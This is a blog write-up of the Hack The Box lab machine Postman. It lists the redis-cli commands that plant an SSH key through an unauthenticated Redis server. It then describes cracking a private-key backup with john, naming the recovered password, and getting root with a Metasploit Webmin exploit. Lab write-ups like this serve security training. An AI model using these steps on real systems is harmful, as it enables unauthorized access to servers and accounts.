---
title:     "Hack The Box - Postman"
tags: [linux,easy,redis,john]
layout: post
categories: HackTheBox
---

![](/img/htb-postman/img8.jpg)

We are going to pwn Postman from Hack The Box. Postman is a easy level linux machine.
Take a cup of tea and let's get started.

Link : <https://www.hackthebox.eu/home/machines/profile/215>

## Enumeration

Lets Begin with our Initial Nmap Scan.

Nmap Scan Results:

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt


PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-server-header: MiniServ/1.910
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Android 4.1.1 (93%), Adtran 424RG FTTH gateway (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


Found that port 80 http is open, so a site must be running. 

![](/img/htb-postman/img13.jpg)

The site looks to be under construction.
The Only thing I got from webpage is email address at the bottom.

Tried DIRB to find out any sub-directories that may help.

![](/img/htb-postman/img17.jpg)

![](/img/htb-postman/img19.jpg)

Tried different wordlists with dirb but the results doesn't reveal any useful directories.
/upload had nothing useful.


Found out that the service “redis” is running on port 6379. 
Interestingly found a nse script for redis-info.

![](/img/htb-postman/img25.jpg)


## Exploiting Redis

Started reading about the redis in detail and to seehow it works. It is used as an
in-memory distributed database.
Also found this Redis Unauthorized Access Vulnerability that saved my life.
https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e

According to it,
Under certain conditions, if Redis runs with the root account (or not even), attackers can
write an SSH public key file to the root account, directly logging on to the victim server
through SSH. This may allow hackers to gain server privileges, delete or steal data, or
even lead to an encryption extortion, critically endangering normal business services.

Nice. I looked at its simulation and started doing the same process.

Also found another link with the same procedure,
https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
These blogs saved my life. So I downloaded the redistools on my machine and started
doing the same steps.


First we generate the SSH KEYS with passphrase (90909090 for this case)

```
$ ssh-keygen -t rsa
```

![](/img/htb-postman/img44.jpg)

Remember, don't leave the passphrase empty. I tried with an empty passphrase and
encountered several problems, idk why. Keep it anything,just dont leave it empty.

Next, enter the .ssh folder. If you are root user,enter /.ssh, otherwise ~/.ssh, then copy
the private key into temp.txt. (or whatever.txt)

```
$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n")> temp.txt
$ cat temp.txt (To Check the Key)
```

![](/img/htb-postman/img46.jpg)

So far we have generated a pair of keys, we will needto find a way to smuggle the
public key to the Redis server.
We are going to use redis-cli, the Redis command lineinterface, to send commands to
Redis and read the replies sent by the server directlyin the terminal.

```
$ cat temp.txt | redis-cli -h 10.10.10.160 -x setfok
```

Once Done, we have a key with our SSH key sneakedin! Let’s connect to the Redis
and play around its configuration. Use redis-cli toconnect to the Redis server again.
Take a look at the site and follow the same commands.

```
$ redis-cli -h 10.10.10.160
10.10.10.160:6379> get fok (key sent from previouscommand)
10.10.10.160:6379> CONFIG GET dir (Tell which directory you are in)
10.10.10.160:6379> CONFIG SET dir var/lib/redis/.ssh (set default directory of user redis)
10.10.10.160:6379> CONFIG SET dbfilename authorized_keys
10.10.10.160:6379> save (save the key)
```

![](/img/htb-postman/img51.jpg)

Let’s Try to Connect with SSH

Enter your passphrase and voila!

![](/img/htb-postman/img55.jpg)

TADA!!! Got a user “redis” shell. DAMN!

## Privilege Escalation

Ran to the /home file to find the user named “MATT”.I found the user.txt inside but
> PERMISSION DENIED!

These sites would help a lot :

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

https://guif.re/linuxeop

https://www.hackingarticles.in/privilege-escalation-cheatsheet-vulnhub/

Tried find the SUID Binaries to see if i could exploit them somehow.

![](/img/htb-postman/img61.jpg)


Tried everything, found the OS, Kernel, Distribution blah blah blah with the above
websites.

Ran LinEnum.sh to get more details.

https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

![](/img/htb-postman/img66.jpg)

Found this through the script,

![](/img/htb-postman/img67.jpg)

Checked the bash_history of user “redis” : (See something common)


![](/img/htb-postman/img70.jpg)

Found a backup of Some Private Key inside the /opt/as /opt/id_rsa.bak and copied to
my Machine. (named it user.hash)

![](/img/htb-postman/img72.jpg)

We convert this private-Key to John Readable Hash with /ssh2john.py so that it can be
cracked with a appropriate wordlist.

$ cd /usr/share/john
You can see lot of keys to john-hash converter python scripts. Use the ssh2john.py
$ ./ssh2john.py {Location of the saved hash} > MATT.hash
This will convert the private ssh key to john readable hash.
$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt MATT.hash

![](/img/htb-postman/img76.jpg)

YEAH!!! Found the user password for “Matt” to be “computer2008”

Login inside the User “Matt”


![](/img/htb-postman/img78.jpg)

Yeah, Found the User Hash.

Tears of joy.

Went back to the HTB Forums and found out this hint:
ROOT: As said, you know are able to use an exploit that you couldn't use before.

Went back to Metasploit for the Webmin Exploit I found earlier but that didn't work. So
Let’s try that :

![](/img/htb-postman/img81.jpg)

It’s the webmin_packageup_rce script. Fired it up and set the options.
Ran the script and voila!!!!

![](/img/htb-postman/img83.jpg)

It worked! Man I knew what i had to do!

![](/img/htb-postman/img85.jpg)

I got root!


